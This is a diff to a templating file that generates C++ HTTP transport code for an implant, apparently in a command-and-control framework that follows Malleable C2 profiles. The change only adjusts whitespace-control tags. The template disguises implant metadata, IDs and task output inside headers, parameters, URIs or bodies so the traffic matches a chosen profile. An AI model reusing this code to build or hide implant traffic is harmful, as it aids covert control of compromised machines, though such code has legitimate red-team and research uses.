@@ -24,9 +24,9 @@ Required Keys:
 #]
 
 
-[% from 'transform.j2' import render_transform -%]
-[% from 'transform_reverse.j2' import render_reverse_transform -%]
-[% from 'http_add_headers_or_parameters.j2' import render_add_headers_or_parameters -%]
+[% from 'transform.j2' import render_transform %]
+[% from 'transform_reverse.j2' import render_reverse_transform %]
+[% from 'http_add_headers_or_parameters.j2' import render_add_headers_or_parameters %]
 
 //specific to the wininet http impl
 #include "protocols/http_wininet/http.h"
@@ -53,11 +53,11 @@ namespace [[ http_function_name ]] {
 
         // --- MetaData Transforms ---
         //Transform metadata before it goes out to match the malleablec2 profile
-        [%- for transform in http_get_client_metadata_transforms_list %]
+        [% for transform in http_get_client_metadata_transforms_list %]
         
         [[ render_transform(transform, 'metadata') ]]
         
-        [%- endfor %]
+        [% endfor %]
         // --- End MetaData Transforms ---
 
         //base variables declared near top so they are in scope
@@ -67,13 +67,13 @@ namespace [[ http_function_name ]] {
         std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
         [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
-        [%- if http_get_client_metadata_terminator == "header" %]
+        [% if http_get_client_metadata_terminator == "header" %]
         headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + w_metadata);
         [% endif %]
 
         [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
         [#(e.g., /search?q=BASE64...)#]
-        [%- if http_get_client_metadata_terminator == "parameter" %]
+        [% if http_get_client_metadata_terminator == "parameter" %]
         // Append '?' or '&' depending on existing query string
         if (uri.find(L'?') != std::wstring::npos) {
             uri += L"&";
@@ -86,7 +86,7 @@ namespace [[ http_function_name ]] {
         [% endif %]
 
         [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
-        [%- if http_get_client_metadata_terminator == "uri-append" %]
+        [% if http_get_client_metadata_terminator == "uri-append" %]
 
         //could use append from transform here too 
         uri += w_metadata;
@@ -94,20 +94,20 @@ namespace [[ http_function_name ]] {
 
 
         [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
-        [%- if http_get_client_metadata_terminator == "print" %]
+        [% if http_get_client_metadata_terminator == "print" %]
 
         //convert back to string for HTTP_GET function
         request_body.assign(w_metadata.begin(), w_metadata.end());
-        [%- endif %]
+        [% endif %]
 
         // --- End Malleable C2 Metadata transport method ---
 
         // --- Add addtl headers/params as specified in mc2 b4 sending off. ---
-        [%- for header_or_param in http_get_client_headers_or_parameters_list %]
+        [% for header_or_param in http_get_client_headers_or_parameters_list %]
         
         [[ render_add_headers_or_parameters(header_or_param) ]]
         
-        [%- endfor %]
+        [% endfor %]
         // --- end --- 
 
         // Call the HTTP_GET
@@ -122,9 +122,9 @@ namespace [[ http_function_name ]] {
 
             // --- Reverse Transforms for Server output ---
 
-            [%- for transform in http_get_server_output_transforms_list %]
+            [% for transform in http_get_server_output_transforms_list %]
             [[ render_reverse_transform(transform, 'http_response_buffer') ]]
-            [%- endfor %]
+            [% endfor %]
 
             // --- End Reverse Transforms for Server output ---
             //string -> vector
@@ -142,12 +142,12 @@ namespace [[ http_function_name ]] {
         //Transform ID as specified by malleablec2
         [% for transform in http_post_client_id_transforms_list %]
         [[ render_transform(transform, 'implant_uuid') ]]
-        [%- endfor %]
+        [% endfor %]
 
         //Transform msgpack output as specified by malleablec2
         [% for transform in http_post_client_output_transforms_list %]
         [[ render_transform(transform, 'payload') ]]
-        [%- endfor %]
+        [% endfor %]
         // --- End Transforms for ID and Output ---
 
 
@@ -171,9 +171,9 @@ namespace [[ http_function_name ]] {
             //Hold ID in [[ http_post_client_id_terminator_value ]]
             headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + w_id);
 
-        [%- endif %]
+        [% endif %]
 
-        [%- if http_post_client_id_terminator == "parameter" %]
+        [% if http_post_client_id_terminator == "parameter" %]
             
             //POST data stored in parameter [[http_post_client_id_terminator]]
             if (uri.find(L'?') != std::wstring::npos) {
@@ -185,9 +185,9 @@ namespace [[ http_function_name ]] {
             }
             uri += L"[[ http_post_client_id_terminator_value ]]=" + w_id;
 
-        [%- endif %]
+        [% endif %]
         
-        [%- if http_post_client_id_terminator == "uri-append" %]
+        [% if http_post_client_id_terminator == "uri-append" %]
 
         //could use append from transform here too
         uri += w_id;
@@ -196,19 +196,19 @@ namespace [[ http_function_name ]] {
         
 
         // 5. Handle Output Placement
-        [# no %- here, as otherwise the previous comment adds the below headers line in #]
+        [# no % here, as otherwise the previous comment adds the below headers line in #]
         [% if http_post_client_output_terminator == "header" %]
 
         headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
 
-        [%- endif %]
+        [% endif %]
 
         [% if http_post_client_output_terminator == "print" %]
 
         //convert back to string for HTTP_POST function
         final_post_body.assign(w_payload.begin(), w_payload.end());
 
-        [%- endif %]
+        [% endif %]
 
         [% if http_post_client_output_terminator == "parameter" %]
 
@@ -217,9 +217,9 @@ namespace [[ http_function_name ]] {
         if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
         uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
 
-        [%- endif %]
+        [% endif %]
 
-        [%- if http_post_client_output_terminator == "uri-append" %]
+        [% if http_post_client_output_terminator == "uri-append" %]
 
         //could use append from transform here too
         uri += w_payload;
@@ -228,9 +228,9 @@ namespace [[ http_function_name ]] {
 
 
         // --- Add addtl headers/params as specified in mc2 b4 sending off ---
-        [%- for header_or_param in http_post_client_headers_or_parameters_list %]
+        [% for header_or_param in http_post_client_headers_or_parameters_list %]
         [[ render_add_headers_or_parameters(header_or_param) ]]
-        [%- endfor %]
+        [% endfor %]
         // --- end ---
 
         // --- End Malleable C2 ID/Output transport method ---
